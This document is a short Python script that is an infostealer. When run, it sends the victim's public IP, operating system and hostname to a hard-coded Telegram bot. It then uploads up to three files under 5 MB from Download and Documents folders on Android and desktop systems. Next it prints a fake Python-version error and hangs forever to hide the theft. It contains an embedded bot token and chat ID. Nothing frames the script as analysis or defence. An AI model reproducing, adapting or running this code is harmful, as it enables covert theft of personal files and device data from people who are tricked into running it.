import os
import socket
import platform
import requests
from datetime import datetime
from glob import glob
import time

# Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨ÙˆØª
TOKEN = "8100570661:AAF5Jvg3NK0aRtEWhyMnB0chs_SwDHM-pLw"
CHAT_ID = "6991944640"

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text.strip()
    except:
        return "0.0.0.0"

def send_text(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        })
    except:
        pass

def send_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID},
                files={"document": f}
            )
    except:
        pass

def scan_and_send_files():
    dirs = [
        "/storage/emulated/0/Download/",
        "/sdcard/Download/",
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Documents")
    ]
    sent = 0
    for folder in dirs:
        if os.path.exists(folder):
            for file in glob(os.path.join(folder, "*")):
                if os.path.isfile(file) and os.path.getsize(file) < 5 * 1024 * 1024:
                    send_file(file)
                    sent += 1
                    if sent >= 3:
                        return

def main():
    ip = get_ip()
    os_info = f"{platform.system()} {platform.release()}"
    host = socket.gethostname()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    msg = f"ğŸ“¡ *Zipped Device Report*\nğŸ“ IP: `{ip}`\nğŸ–¥ï¸ OS: `{os_info}`\nğŸ”Œ Host: `{host}`\nâ° Time: `{now}`"
    send_text(msg)
    scan_and_send_files()

    print("ğŸ”„ Checking system dependencies...")
    time.sleep(2)
    print("â— Python 3.7 detected. Incompatible with this module.")
    print("ğŸ› ï¸ Please update your Python interpreter to version 3.11 or higher.")
    print("â³ Waiting for update...")
    while True:
        time.sleep(5)  # ÙŠØ¹Ù„Ù‚ ÙÙŠ Ø­Ù„Ù‚Ø© Ù…Ø²ÙŠÙØ© Ø¨Ø¯ÙˆÙ† Ø®Ø±ÙˆØ¬

main()